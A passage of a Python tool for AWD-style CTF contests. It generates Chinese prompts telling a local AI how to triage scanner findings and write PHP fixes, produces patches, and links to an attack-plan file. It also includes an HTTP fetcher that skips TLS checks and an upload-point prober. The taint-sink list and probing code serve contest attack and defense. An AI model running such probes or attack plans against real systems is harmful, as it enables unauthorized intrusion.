        "- 中间**没有**能挡住的白名单校验（黑名单 `str_replace('../')` 不算）。",
        "",
        "`NOTES.md` 格式（一条一行，别用表格写代码）：",
        "",
        "```",
        "qzone/deploy/router.php:20 -> 真 -> REQUEST_URI 直达 readfile，可读 config/app.php",
        "qzone/deploy/app/controllers/BlogController.php:28 -> 误报 -> $this->dataFile 构造时写死",
        "```",
        "",
        "## 第二步：写 fixed/",
        "",
        "1. 先清空：`rm -rf %s/fixed`（上一轮残留会污染 diff）" % d,
        "2. 每个改动过的文件写**完整内容**到 `%s/fixed/<与 src 相同的相对路径>`；" % d,
        "   改了 `src/qzone/deploy/app/x.php` → 写 `fixed/qzone/deploy/app/x.php`（一行都不能省）。",
        "3. 没改的文件不要碰，也不要复制进 `fixed/`。",
        "4. 保持原换行风格（CRLF 继续 CRLF）和缩进，只改必要的行。",
        "5. 每写完一个文件立刻 `php -l 文件` / `python3 -m py_compile 文件`。",
        "",
        "## 第三步：跑验收（不过就改，改完再跑）",
        "",
        "```bash",
        "cd %s" % d,
        "python3 check_fixed.py -v      # 路径/语法/换行/改动规模/坏写法/覆盖率",
        "python3 make_patch.py fixed/   # 生成 fixes.patch，内部 git apply --check 自校验",
        "```",
        "",
        "`check_fixed.py` 会直接抓出下面这些必错项，**FAIL 一条都不许往下走**：",
        "",
        "- `fixed/` 是空的（= 你只在聊天里贴了代码）；",
        "- 文件路径在 `src/` 里不存在（目录结构写错）；",
        "- `php -l` 语法错误；",
        "- 换行风格被改（diff 会整文件重写）；",
        "- 单文件改动超过 50%（像是整文件重写，review 不了）；",
        "- 命中已知坏写法（见下节）；",
        "- 高危/严重问题有文件没被覆盖。",
        "",
        "## 已知坏写法（check_fixed.py 会拦，别写）",
        "",
        "| 别写 | 为什么 | 改成 |",
        "|---|---|---|",
        "| `private const X = getenv('A');` | PHP 常量只能用字面量，**Fatal error 整站 500** | `private static function x(): string { $v = getenv('A'); return is_string($v) ? $v : ''; }` |",
        "| `$d = realpath($p); mkdir($d);` | 目录不存在时 realpath 返回 `false`，mkdir 永不执行，**新建目录功能坏掉** | 先 `@mkdir($p, 0755, true)`，再 `realpath` 做前缀校验 |",
        "| `$this->viewData = [...]` | Controller 没有这个属性；模板靠**局部变量**作用域，等于删了功能 | 保留原来的 `extract([...])` 或改成显式 `$title = ...;` |",
        "| `unserialize($x)` | 魔术方法可被触发 → RCE | `json_decode($x, true)`，或至少 `unserialize($x, ['allowed_classes' => false])` |",
        "| 在 markdown 表格/聊天里写 PHP | 表格的竖线会把代码撕成语法错误 | 写进文件，永远不要贴在聊天里 |",
        "",
        "## 语言相关的坑",
        "",
        "- **PHP 密码比较**：`hash_equals()` 且 `(string)` 强转，避免 null 报错和时序侧信道。",
        "- **PHP 硬编码口令**：删掉明文常量，改读环境变量或 `config/xxx.php` 返回的哈希，用 `password_verify()` 校验；",
        "  同时**保留原口令能登录**（写个 bcrypt 哈希放进去），否则功能测试会挂。",
        "- **SQL**：改 PDO `prepare` + 绑定，不要 `addslashes` 或正则过滤。",
        "- **文件读取/包含**：白名单映射；路径校验用 `realpath()` + `strpos($real, $root . DIRECTORY_SEPARATOR) === 0`，",
        "  注意 `$root` 也要 `realpath` 归一化，且前缀后必须带分隔符（否则 `/publicX` 会误判通过）。",
        "- **上传**：扩展名白名单 + 真实 MIME + 重命名 + 禁止 `..` 和路径分隔符；文件名要 `basename()`。",
        "- **反序列化**：优先 `json_decode`；必须保留 `unserialize` 时加 `['allowed_classes' => false]` 并 `is_array()` 校验。",
        "- **CORS**：不要 `*`，改成回显同源白名单 + `Vary: Origin`。",
        "",
        "## 应用补丁（打完要复验）",
        "",
        "```bash",
        "# 自动探测 -p 层级，别自己算 --strip",
        "python3 make_patch.py fixed/ --apply-to <靶场根目录>",
        "",
        "# 手动方式（在靶场根目录）",
        "git apply /path/to/fixes.patch     # 报路径错就试 -p2 / -p3",
        "patch -p2 < /path/to/fixes.patch   # 没有 git 的机器",
        "```",
        "",
        "打完补丁**重放 `attack-plan.md` 里的原 payload**，确认打不进去，同时确认正常功能还能用。",
        "",
        "## 收尾",
        "",
        "- 顺手看看同目录其它控制器有没有同样写法，一起修（扫描器常漏）。",
        "- 不要改文件名 / 类名 / 路由，否则其它模块会 500。",
        "- 不要引入第三方依赖，靶场环境装不上。",
        "",
        "最后把 `python3 check_fixed.py` 和 `python3 make_patch.py fixed/` 的输出贴回来。",
    ]
    return "\n".join(L) + "\n"


def _render_prompt_txt(meta: dict, findings: list) -> str:
    """prompt.txt / README.md：人复制给本地 AI 的短版提示词。

    第一屏必须有「写文件」和「跑验收」，否则本地 AI 会在聊天里贴一堆代码然后收工。
    """
    d = meta["dir"]
    top = [f for f in findings if f["sev"] in ("critical", "high")]
    rest = [f for f in findings if f["sev"] not in ("critical", "high")]
    L = [
        "我在做 AWD 的 %s 环节，下面是一个 %s 项目的扫描结果。" % (
            meta["scan_type"], _lang_desc(meta.get("langs") or [])),
        "",
        "【本地链接】%s" % meta["url"],
        "【磁盘目录】%s" % d,
        "【全文包】%sbundle.md  （在线 AI：直接把这个文件上传/粘贴即可）" % meta["url"],
        "【攻击路线】%sattack-plan.md  （每条的入口/payload/flag 位置）" % meta["url"],
        "【修复清单】%sfix-plan.md  （每条根因/最小改动/验证方法）" % meta["url"],
        "【本地AI任务书】%slocal-ai.md  （整篇复制给本地 AI，它直接写 fixed/）" % meta["url"],
        "【单文件】%sraw?p=src/<相对路径>  （让 AI 按需读取）" % meta["url"],
        "",
        "项目共 %d 个源码文件，扫描器报出 %d 条问题（严重 %d / 高危 %d / 中危 %d / 低危 %d）。" % (
            meta["file_count"], meta["finding_count"], meta["by_sev"]["critical"],
            meta["by_sev"]["high"], meta["by_sev"]["medium"], meta["by_sev"]["low"]),
        "",
        "========== 零、三条铁律（先读这个） ==========",
        "",
        "1. **不写文件 = 交白卷。** 在聊天里贴的代码会被丢弃，`%s/fixed/` 里有文件才算数。" % d,
        "2. **误报不要改。** 判为误报的只在 `NOTES.md` 写理由，不要动 `fixed/` —— 改误报会白做还改坏功能。",
        "3. **`python3 check_fixed.py` 不全绿不算完成。**",
        "",
        "========== 一、全部 %d 条（一条都不能跳过） ==========" % len(findings),
        "",
        "```",
    ]
    for i, f in enumerate(findings, 1):
        L.append("%2d. [%s] %s — %s:%d" % (
            i, f["sev"].upper(), f["name"], f["file"], f["line"]))
    L += [
        "```",
        "",
        "低危也要修。`uniqid()` / `rand()` 这类可预测 ID 在 AWD 里会被对面直接枚举，",
        "别当「只是展示用」放过。",
        "",
        "========== 二、判定真 / 误报（写 NOTES.md，不改代码） ==========",
        "",
        "判**误报**（满足任一，且必须写明是哪条）：",
        "",
        "- 汇点的路径/参数不是用户可控（常量、配置、构造时写死的值）；",
        "- `extract()` 的数组是字面量且键名与已有变量同名（等价 no-op）；",
        "- 值来自固定白名单查表，例如 `$mimeTypes[$ext] ?? 'application/octet-stream'`；",
        "- 输出已经过 `htmlspecialchars()` / `JSON_HEX_*` / 参数化查询。",
        "",
        "判**真漏洞**（必须同时满足）：",
        "",
        "- 污点源可控：`$_GET` / `$_POST` / `$_COOKIE` / `$_REQUEST` / `REQUEST_URI` / 上传文件名与内容 / HTTP 头；",
        "- 能到危险汇点：`file_put_contents` / `readfile` / `include` / `unserialize` / `header` / SQL / `eval` / `system`；",
        "- 中间没有能挡住的白名单校验（黑名单 `str_replace('../')` 不算）。",
        "",
        "`NOTES.md` 一条一行：",
        "",
        "```",
        "%s:%d -> 真/误报 -> 一句话理由" % (
            (top[0]["file"], top[0]["line"]) if top else ("<file>", 0)),
        "```",
        "",
        "========== 三、写修复文件（不要在聊天里贴代码） ==========",
        "",
        "1. 开工前先 `rm -rf %s/fixed` 清掉上一轮残留；" % d,
        "2. 每个改动过的文件，用【完整内容】写到 `%s/fixed/` 下，" % d,
        "   目录结构与 `src/` 完全一致：改了 `src/qzone/deploy/app/x.php`，",
        "   就写 `fixed/qzone/deploy/app/x.php`（整个文件，一行都不能省）；",
        "3. 没改的文件不要碰，也不要复制进 `fixed/`；",
        "4. 保持原文件换行风格（CRLF 继续 CRLF、LF 继续 LF）和缩进；",
        "5. 只改必要的行，不要重排/格式化整个文件（改动超过 50% 会被判整文件重写）；",
        "6. 每写完一个文件立刻自查：`php -l 文件` 或 `python3 -m py_compile 文件`。",
        "",
        "========== 四、跑验收（不过就改，改完再跑） ==========",
        "",
        "```bash",
        "cd %s" % d,
        "pwd                            # 确认没在别的会话目录里干活",
        "python3 check_fixed.py -v      # 路径/语法/换行/改动规模/坏写法/覆盖率",
        "python3 make_patch.py fixed/   # 生成 fixes.patch，内部 git apply --check 自校验",
        "",
        "# 生成 + 直接应用到靶场（自动探测 -p 层级，别自己算 --strip）",
        "python3 make_patch.py fixed/ --apply-to <靶场根目录>",
        "```",
        "",
        "`check_fixed.py` 会拦下这些必错项，FAIL 一条都不许往下走：",
        "`fixed/` 是空的 / 路径在 `src/` 里不存在 / `php -l` 语法错误 / 换行风格被改 /",
        "单文件改动 >50% / 命中已知坏写法 / 高危或严重问题有文件没覆盖。",
        "",
        "========== 五、已知坏写法（check_fixed.py 会拦） ==========",
        "",
        "```php",
        "// ❌ PHP 常量只能用字面量，这样写直接 Fatal error，整站 500",
        "private const ADMIN_PASS = getenv('ADMIN_PASS') ?: '';",
        "// ✅",
        "private static function adminPass(): string {",
        "    $v = getenv('ADMIN_PASS');",
        "    return is_string($v) ? $v : '';",
        "}",
        "",
        "// ❌ 目录不存在时 realpath 返回 false，mkdir 永不执行 → 新建目录功能坏掉",
        "$realPath = realpath($fullDir);",
        "if ($realPath) { @mkdir($realPath, 0755, true); }",
        "// ✅ 先建后校验",
        "if (!is_dir($fullDir)) { @mkdir($fullDir, 0755, true); }",
        "$realDir = realpath($fullDir);",
        "if ($realDir === false || strpos($realDir, realpath(ROOT_PATH)) !== 0) { /* 拒绝 */ }",
        "",
        "// ❌ Controller 没有 viewData 属性；模板靠局部变量作用域，这样改等于删功能",
        "$this->viewData = ['title' => $title];",
        "// ✅ 保留原来的局部变量 / extract 写法",
        "",
        "// ❌ 魔术方法可被触发 → RCE",
        "$prefs = unserialize($raw);",
        "// ✅",
        "$prefs = json_decode($raw, true) ?: [];",
        "$prefs = unserialize($raw, ['allowed_classes' => false]);  // 必须保留时",
        "```",
        "",
        "**永远不要在 markdown 表格里写代码** —— 表格的 `|` 会把代码撕成语法错误。",
        "",
        "========== 六、其它语言坑 ==========",
        "",
        "- 密码比较用 `hash_equals()` 且 `(string)` 强转，避免 null 报错和时序侧信道；",
        "- 硬编码口令改成环境变量或 `config/*.php` 返回的 **bcrypt 哈希** + `password_verify()`，",
        "  但要**保留原口令能登录**（把原口令的哈希写进配置），否则功能测试会挂；",
        "- 路径校验：`realpath()` + `strpos($real, $root . DIRECTORY_SEPARATOR) === 0`，",
        "  `$root` 也要归一化，且前缀后必须带分隔符（否则 `/publicX` 会误判通过）；",
        "- 上传：扩展名白名单 + 真实 MIME + `basename()` 重命名 + 拒绝 `..` 和路径分隔符；",
        "- CORS：不要 `*`，回显同源白名单 + `Vary: Origin`；",
        "- SQL：PDO `prepare` + 绑定，不要 `addslashes`；",
        "- 文件包含：白名单映射，不要 `str_replace('../')` 黑名单。",
        "",
        "========== 七、应用补丁后必须复验 ==========",
        "",
        "重放 `attack-plan.md` 里的原 payload，确认打不进去；同时确认正常功能还能用",
        "（登录、列表、上传、评论这些主流程不能 500）。",
        "",
        "```bash",
        "git apply /path/to/fixes.patch     # 报路径错就试 -p2 / -p3",
        "patch -p2 < /path/to/fixes.patch   # 没有 git 的机器",
        "```",
        "",
        "最后把 `python3 check_fixed.py` 和 `python3 make_patch.py fixed/` 的输出贴回来。",
    ]
    return "\n".join(L) + "\n"


def _md_inline(text: str) -> str:
    """把 playbook 里的 **粗体** / `代码` 转成 HTML（先转义，再替换）。"""
    s = html.escape(str(text), quote=False)
    s = re.sub(r"`([^`]+)`", r"<code>\1</code>", s)
    s = re.sub(r"\*\*([^*]+)\*\*", r"<b>\1</b>", s)
    return s


def _pb_html(finding: dict) -> str:
    pb = _playbook_for(finding)
    atk = "".join("<li>%s</li>" % _md_inline(x) for x in pb["attack"])
    fix = "".join("<li>%s</li>" % _md_inline(x) for x in pb["fix"])
    return ('<details class="pb"><summary>%s · ⚔️ 攻击 / 🛡️ 修复</summary>'
            '<div><b>⚔️ 攻击思路</b><ol>%s</ol><b>🛡️ 修复思路</b><ol>%s</ol></div>'
            '</details>') % (html.escape(pb["label"]), atk, fix)


def _render_index_html(meta: dict, findings: list, files: list) -> str:
    e = html.escape
    rows = []
    for i, f in enumerate(findings, 1):
        rows.append(
            '<tr class="%s"><td>%d</td><td><span class="sev %s">%s</span></td><td>%s</td>'
            '<td><a href="raw?p=%s" target="_blank">%s:%d</a></td><td>%s</td></tr>' % (
                f["sev"], i, f["sev"], f["sev"].upper(), e(f["name"]),
                quote("src/" + f["file"]), e(f["file"]), f["line"], _pb_html(f)))
    file_rows = []
    for path, text, truncated in files:
        file_rows.append('<li><a href="raw?p=%s" target="_blank">%s</a> <i>%d B%s</i></li>' % (
            quote("src/" + path), e(path), len(text.encode("utf-8")),
            " · 截断" if truncated else ""))
    return """<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8">
<title>%(name)s · AI 修复包</title><style>
body{background:#0d1117;color:#c9d1d9;font:14px/1.65 -apple-system,"PingFang SC",sans-serif;margin:0}
.wrap{max-width:1080px;margin:0 auto;padding:26px 20px 60px}
h1{font-size:20px;margin:0 0 6px}h1 small{font-size:12px;color:#7d8794;font-weight:400}
.links{display:flex;flex-wrap:wrap;gap:10px;margin:18px 0}
a.btn{background:#1f6feb;color:#fff;text-decoration:none;padding:7px 14px;border-radius:7px;font-size:13px}
a.btn.alt{background:#21262d;color:#58a6ff;border:1px solid #30363d}
.card{background:#161b22;border:1px solid #21262d;border-radius:10px;padding:14px 16px;margin:14px 0}
code,pre{font-family:ui-monospace,Menlo,monospace;font-size:12px}
pre{background:#0b0f14;border:1px solid #1b2129;border-radius:8px;padding:10px;overflow:auto;max-height:340px}
table{width:100%%;border-collapse:collapse;font-size:12.5px}
th,td{text-align:left;padding:7px 9px;border-bottom:1px solid #21262d}
th{color:#7d8794;font-weight:500}
.sev{font-size:10px;padding:1px 7px;border-radius:20px;font-weight:600}
.sev.critical{background:#3d1017;color:#ff4d5e}.sev.high{background:#3a2110;color:#ff8a3d}
.sev.medium{background:#3a3110;color:#ffd23d}.sev.low{background:#12301f;color:#6fcf97}
tr.critical td:first-child{border-left:3px solid #ff4d5e}tr.high td:first-child{border-left:3px solid #ff8a3d}
ul.files{columns:2;font-size:12.5px;padding-left:18px}ul.files i{color:#6e7681;font-style:normal;font-size:11px}
details.pb summary{cursor:pointer;color:#58a6ff;font-size:11.5px;white-space:nowrap}
details.pb>div{margin-top:8px;font-size:11.5px;line-height:1.55;min-width:320px;white-space:normal}
details.pb ol{padding-left:16px;margin:4px 0 10px}details.pb b{color:#8b949e;font-size:11px}
a{color:#58a6ff}
</style></head><body><div class="wrap">
<h1>%(name)s <small>· AI 修复包</small></h1>
<div style="color:#7d8794;font-size:12px">%(created)s · AWDP %(stype)s · 引擎 %(engine)s ·
 %(fcount)d 文件 · %(nfind)d 条问题（严重 %(c)d / 高危 %(h)d / 中危 %(m)d / 低危 %(l)d）</div>
<div class="links">
  <a class="btn" href="bundle.md" target="_blank">打开 bundle.md（全文）</a>
  <a class="btn alt" href="bundle.md" download>下载 bundle.md</a>
  <a class="btn" href="attack-plan.md" target="_blank">⚔️ attack-plan.md（攻击路线）</a>
  <a class="btn" href="fix-plan.md" target="_blank">🛡️ fix-plan.md（修复清单）</a>
  <a class="btn" href="local-ai.md" target="_blank">🤖 local-ai.md（丢给本地 AI 的任务书）</a>
  <a class="btn alt" href="prompt.txt" target="_blank">prompt.txt（提示词）</a>
  <a class="btn alt" href="findings.json" target="_blank">findings.json</a>
  <a class="btn alt" href="tree.txt" target="_blank">tree.txt</a>
  <a class="btn alt" href="make_patch.py" download>📦 make_patch.py（生成补丁）</a>
  <a class="btn alt" href="extract_files.py" download>✂️ extract_files.py（拆 AI 回复）</a>
</div>
<div class="card"><b>给本地 AI 用（推荐）</b>
<pre>1) 打开 %(url)slocal-ai.md ，整篇复制给本地 AI（Cursor / Claude Desktop / Copilot / Ollama）；
2) AI 直接读 %(dir)s/src ，把改好的【完整文件】写进 %(dir)s/fixed/ ；
3) 生成补丁（行号由脚本算，AI 不用数）：
     cd %(dir)s
     python3 make_patch.py fixed/
     # src/ 路径带顶层目录时： python3 make_patch.py fixed/ --strip 1
4) 应用到靶场（在项目根目录）：
     git apply fixes.patch        # 或 patch -p1 &lt; fixes.patch
5) 重放原 payload，确认打不进去了。

按需读单个文件：%(url)sraw?p=src/相对路径

【备用】在线 AI（不能写文件）：
  让它用 === FILE: 路径 === 格式输出，存成 ai.txt 后
  python3 extract_files.py ai.txt &amp;&amp; python3 make_patch.py fixed/</pre></div>
<div class="card"><b>问题清单（%(nfind)d）</b><table><thead><tr><th>#</th><th>等级</th><th>问题</th><th>位置</th><th>思路</th></tr></thead>
<tbody>%(rows)s</tbody></table></div>
<div class="card"><b>源码文件（%(fcount)d）</b><ul class="files">%(frows)s</ul></div>
</div></body></html>""" % {
        "name": e(meta["name"]), "created": e(meta["created_at"]), "stype": e(meta["scan_type"]),
        "engine": e(meta["engine"]), "fcount": meta["file_count"], "nfind": len(findings),
        "c": meta["by_sev"]["critical"], "h": meta["by_sev"]["high"],
        "m": meta["by_sev"]["medium"], "l": meta["by_sev"]["low"],
        "dir": e(meta["dir"]), "url": e(meta["url"]),
        "rows": "".join(rows) or '<tr><td colspan="5" style="color:#6e7681">无</td></tr>',
        "frows": "".join(file_rows),
    }


def _index_has_new_links(path: str) -> bool:
    try:
        with open(path, "rb") as fh:
            raw = fh.read()
        return (b"attack-plan.md" in raw and b"make_patch.py" in raw
                and b"local-ai.md" in raw)
    except Exception:
        return False


def _awdp_backfill_index(sdir: str) -> bool:
    """老会话的 index.html 没有 attack-plan/fix-plan 按钮，按 src/ + findings.json 重建。"""
    try:
        with open(os.path.join(sdir, "findings.json"), encoding="utf-8") as fh:
            data = json.load(fh) or {}
        meta = data.get("meta") or {}
        findings = [_norm_finding(f) for f in (data.get("findings") or []) if isinstance(f, dict)]
        if not meta.get("name"):
            return False
        src_root = os.path.join(sdir, "src")
        files: list[tuple[str, str, bool]] = []
        for dirpath, _dirs, names in os.walk(src_root):
            for nm in sorted(names):
                fp = os.path.join(dirpath, nm)
                rel = os.path.relpath(fp, src_root).replace(os.sep, "/")
                try:
                    with open(fp, "rb") as fh:
                        text = fh.read().decode("utf-8", "replace")
                except Exception:
                    continue
                truncated = len(text) > AWDP_MAX_FILE_BYTES
                if truncated:
                    text = text[:AWDP_MAX_FILE_BYTES]
                files.append((rel, text, truncated))
        files.sort(key=lambda x: x[0])
        meta.setdefault("url", "")
        meta.setdefault("dir", sdir)
        meta.setdefault("tree", [p for p, _, _ in files])
        meta.setdefault("langs", [])
        meta.setdefault("file_count", len(files))
        meta.setdefault("skipped", 0)
        meta.setdefault("finding_count", len(findings))
        meta.setdefault("by_sev", {"critical": 0, "high": 0, "medium": 0, "low": 0})
        meta.setdefault("scan_type", "break")
        meta.setdefault("engine", "awdpplus")
        meta.setdefault("created_at", "")
        with open(os.path.join(sdir, "index.html"), "w", encoding="utf-8", errors="replace") as fh:
            fh.write(_render_index_html(meta, findings, files))
        return True
    except Exception:
        return False


def _awdp_backfill(sdir: str, fname: str) -> bool:
    """老会话缺 attack-plan.md / fix-plan.md 时，用 findings.json 现算一份写盘。"""
    try:
        with open(os.path.join(sdir, "findings.json"), encoding="utf-8") as fh:
            data = json.load(fh) or {}
        meta = data.get("meta") or {}
        findings = [_norm_finding(f) for f in (data.get("findings") or []) if isinstance(f, dict)]
        if not meta.get("name"):
            return False
        meta.setdefault("url", "")
        meta.setdefault("dir", sdir)
        meta.setdefault("tree", [])
        meta.setdefault("langs", [])
        meta.setdefault("file_count", len(meta.get("tree") or []))
        meta.setdefault("skipped", 0)
        meta.setdefault("finding_count", len(findings))
        meta.setdefault("by_sev", {"critical": 0, "high": 0, "medium": 0, "low": 0})
        meta.setdefault("scan_type", "break")
        meta.setdefault("engine", "awdpplus")
        meta.setdefault("created_at", "")
        if fname == "attack-plan.md":
            text = _render_attack_plan(meta, findings)
        elif fname == "local-ai.md":
            text = _render_local_ai_md(meta, findings)
        else:
            text = _render_fix_plan(meta, findings)
        with open(os.path.join(sdir, fname), "w", encoding="utf-8", errors="replace") as fh:
            fh.write(text)
        return True
    except Exception:
        return False


def _prompt_has_patch_rules(path: str) -> bool:
    try:
        with open(path, "rb") as fh:
            return b"--apply-to" in fh.read()
    except Exception:
        return False


def _awdp_backfill_prompt(sdir: str) -> bool:
    """老会话的 prompt.txt / README.md 没有 patch 规范，按 findings.json 重写。"""
    try:
        with open(os.path.join(sdir, "findings.json"), encoding="utf-8") as fh:
            data = json.load(fh) or {}
        meta = data.get("meta") or {}
        findings = [_norm_finding(f) for f in (data.get("findings") or []) if isinstance(f, dict)]
        if not meta.get("url"):
            return False
        text = _render_prompt_txt(meta, findings)
        for fname in ("prompt.txt", "README.md"):
            with open(os.path.join(sdir, fname), "w", encoding="utf-8") as fh:
                fh.write(text)
        la = os.path.join(sdir, "local-ai.md")
        if not _prompt_has_patch_rules(la):
            with open(la, "w", encoding="utf-8") as fh:
                fh.write(_render_local_ai_md(meta, findings))
        _awdp_copy_make_patch(sdir)
        return True
    except Exception:
        return False


def _awdp_copy_make_patch(sdir: str) -> None:
    """把 patch 工具复制进会话目录，让 AI 修复包自带生成补丁的能力。"""
    for fn in AWDP_TOOL_FILES:
        src = os.path.join(AWDP_TOOLS, fn)
        try:
            if os.path.isfile(src):
                dst = os.path.join(sdir, fn)
                shutil.copyfile(src, dst)
                os.chmod(dst, 0o755)
        except Exception:
            pass


def create_awdp_session(params: dict, base_url: str) -> dict:
    name = str(params.get("name") or "upload.zip")
    scan_type = str(params.get("scan_type") or "break").lower()
    if scan_type not in ("break", "fix"):
        scan_type = "break"
    engine = str(params.get("engine") or "awdpplus")
    findings = [_norm_finding(f) for f in (params.get("findings") or []) if isinstance(f, dict)]

    sid = awdp_new_id(name)
    sdir = os.path.join(awdp_root(), sid)
    os.makedirs(os.path.join(sdir, "src"), exist_ok=True)

    collected, skipped = _awdp_collect(params)
    if not collected:
        raise ValueError("压缩包里没有可用的源码文件（支持 .php/.java/.go/.py/.js/.aspx 等文本源码）")

    files: list[tuple[str, str, bool]] = []
    for rel, data in collected:
        text = data.decode("utf-8", "replace")
        if "\ufffd" in text[:2000]:
            for enc in ("gbk", "gb18030", "big5"):
                try:
                    text = data.decode(enc)
                    break
                except Exception:
                    continue
        truncated = False
        if len(text) > AWDP_MAX_FILE_BYTES:
            text = text[:AWDP_MAX_FILE_BYTES]
            truncated = True
        dst = os.path.join(sdir, "src", *rel.split("/"))
        os.makedirs(os.path.dirname(dst), exist_ok=True)
        with open(dst, "w", encoding="utf-8", errors="replace") as fh:
            fh.write(text)
        files.append((rel, text, truncated))

    by_sev = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    for f in findings:
        by_sev[f["sev"]] = by_sev.get(f["sev"], 0) + 1

    url = "%s/awdp/%s/" % (base_url.rstrip("/"), sid)
    meta = {
        "id": sid,
        "name": name,
        "scan_type": scan_type,
        "engine": engine,
        "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "dir": sdir,
        "url": url,
        "file_count": len(files),
        "skipped": skipped,
        "finding_count": len(findings),
        "by_sev": by_sev,
        "tree": sorted(p for p, _, _ in files),
        "langs": sorted({(p.rsplit(".", 1)[-1].lower() if "." in p else "?") for p, _, _ in files}),
    }

    bundle = _render_bundle_md(meta, files, findings)
    prompt = _render_prompt_txt(meta, findings)
    index = _render_index_html(meta, findings, files)
    attack_plan = _render_attack_plan(meta, findings)
    fix_plan = _render_fix_plan(meta, findings)
    local_ai = _render_local_ai_md(meta, findings)

    def write(fname, content):
        with open(os.path.join(sdir, fname), "w", encoding="utf-8", errors="replace") as fh:
            fh.write(content)

    write("bundle.md", bundle)
    write("bundle.txt", "\n\n".join("===== %s =====\n%s" % (p, t) for p, t, _ in files))
    write("prompt.txt", prompt)
    write("index.html", index)
    write("tree.txt", "\n".join(meta["tree"]) + "\n")
    write("attack-plan.md", attack_plan)
    write("fix-plan.md", fix_plan)
    write("local-ai.md", local_ai)
    _awdp_copy_make_patch(sdir)
    enriched = []
    for f in findings:
        pb = _playbook_for(f)
        enriched.append(dict(f, playbook={"key": pb["key"], "label": pb["label"],
                                          "attack": pb["attack"], "fix": pb["fix"]}))
    write("findings.json", json.dumps({"meta": meta, "findings": enriched},
                                      ensure_ascii=False, indent=2))
    write("README.md", prompt)

    return {
        "id": sid,
        "name": name,
        "scan_type": scan_type,
        "dir": sdir,
        "url": url,
        "file_count": len(files),
        "finding_count": len(findings),
        "by_sev": by_sev,
        "skipped": skipped,
        "bundle_bytes": len(bundle.encode("utf-8")),
        "attack_bytes": len(attack_plan.encode("utf-8")),
        "fix_bytes": len(fix_plan.encode("utf-8")),
        "local_ai_bytes": len(local_ai.encode("utf-8")),
        "links": {
            "index": url,
            "bundle": url + "bundle.md",
            "bundle_txt": url + "bundle.txt",
            "attack_plan": url + "attack-plan.md",
            "fix_plan": url + "fix-plan.md",
            "local_ai": url + "local-ai.md",
            "prompt": url + "prompt.txt",
            "findings": url + "findings.json",
            "tree": url + "tree.txt",
            "raw": url + "raw?p=src/",
        },
    }


def list_awdp_sessions(limit: int = 20) -> list[dict]:
    root = awdp_root()
    out = []
    try:
        names = sorted(os.listdir(root), reverse=True)[:limit]
    except Exception:
        return out
    for n in names:
        d = os.path.join(root, n)
        if not os.path.isdir(d):
            continue
        try:
            with open(os.path.join(d, "findings.json"), encoding="utf-8") as fh:
                meta = (json.load(fh) or {}).get("meta", {})
        except Exception:
            meta = {}
        out.append({"id": n, "dir": d, "name": meta.get("name", n),
                    "file_count": meta.get("file_count", 0),
                    "finding_count": meta.get("finding_count", 0),
                    "created_at": meta.get("created_at", "")})
    return out


# ---------------------------------------------------------------- HTTP 客户端

class FetchResult(dict):
    pass


def fetch(url: str, method: str = "GET", body: bytes | None = None,
          headers: dict | None = None, timeout: float = 6.0,
          max_body: int = MAX_BODY, redirects: int = 3) -> FetchResult:
    cur = url
    last_err = None
    for _ in range(redirects + 1):
        try:
            u = urlsplit(cur)
            scheme = u.scheme or "http"
            host = u.hostname
            if not host:
                return FetchResult(error="无效 URL")
            port = u.port or (443 if scheme == "https" else 80)
            path = u.path or "/"
            if u.query:
                path += "?" + u.query
            h = {"User-Agent": UA, "Accept": "*/*", "Connection": "close"}
            if headers:
                h.update(headers)

            if scheme == "https":
                ctx = ssl._create_unverified_context()
                conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
            else:
                conn = http.client.HTTPConnection(host, port, timeout=timeout)

            conn.request(method, path, body=body, headers=h)
            resp = conn.getresponse()
            data = resp.read(max_body)
            hdrs = {k.lower(): v for k, v in resp.getheaders()}
            conn.close()

            if resp.status in (301, 302, 303, 307, 308) and hdrs.get("location"):
                cur = urljoin(cur, hdrs["location"])
                continue
            return FetchResult(status=resp.status, headers=hdrs, body=data,
                               url=cur, error=None)
        except Exception as exc:  # noqa: BLE001
            last_err = str(exc)
            break
    return FetchResult(status=0, headers={}, body=b"", url=cur, error=last_err or "请求失败")


def page_info(url: str, timeout: float = 6.0) -> dict | None:
    res = fetch(url, timeout=timeout)
    if res.get("error") or not res.get("status"):
        return None
    body = res["body"]
    text = body.decode("utf-8", "replace")
    m = re.search(r"<title[^>]*>(.*?)</title>", text, re.I | re.S)
    title = re.sub(r"\s+", " ", m.group(1)).strip()[:120] if m else ""
    return {
        "url": res["url"],
        "status": res["status"],
        "server": res["headers"].get("server", ""),
        "powered": res["headers"].get("x-powered-by", ""),
        "content_type": res["headers"].get("content-type", ""),
        "title": title,
        "length": len(body),
        "text": text,
    }


# ---------------------------------------------------------------- 上传点探测

def attr(tag: str, name: str) -> str:
    m = re.search(name + r"\s*=\s*[\"']([^\"']*)[\"']", tag, re.I)
    if not m:
        m = re.search(name + r"\s*=\s*([^\s>]+)", tag, re.I)
    return m.group(1) if m else ""


def multipart_body(field: str, filename: str, content: bytes) -> tuple[bytes, str]:
    boundary = "----LingOpsProbe" + uuid.uuid4().hex[:16]
    parts = [
        ("--%s\r\n" % boundary).encode(),
        ('Content-Disposition: form-data; name="%s"; filename="%s"\r\n' % (field, filename)).encode(),
        b"Content-Type: application/octet-stream\r\n\r\n",
        content,
        ("\r\n--%s--\r\n" % boundary).encode(),
    ]
    return b"".join(parts), "multipart/form-data; boundary=%s" % boundary


def analyze_upload_response(res: FetchResult, filename: str) -> dict:
    text = res.get("body", b"")[:6000].decode("utf-8", "replace")
    low = text.lower()
    evidence = ""
    accepted = False
    found_url = ""

    try:
        data = json.loads(text)
        if isinstance(data, dict):
            for key in ("url", "path", "src", "fileUrl", "file_url", "location", "filename",
                        "fileName", "name", "ret"):
                val = data.get(key)
                if isinstance(val, str) and val:
                    if key in ("url", "path", "src", "fileUrl", "file_url", "location"):
                        found_url = val
                    evidence = "JSON %s=%s" % (key, val[:120])
                    accepted = True
                    break
            if not accepted:
                for key in ("code", "status", "ret", "errno"):
                    if key in data and str(data[key]) in ("0", "1", "200", "true", "True"):
                        accepted = True
                        evidence = "JSON %s=%s" % (key, data[key])
                        break
                if not accepted and data.get("success") in (True, "true", 1):
                    accepted = True
                    evidence = "JSON success=true"
    except Exception:
        pass

    if not accepted:
        for word in SUCCESS_WORDS:
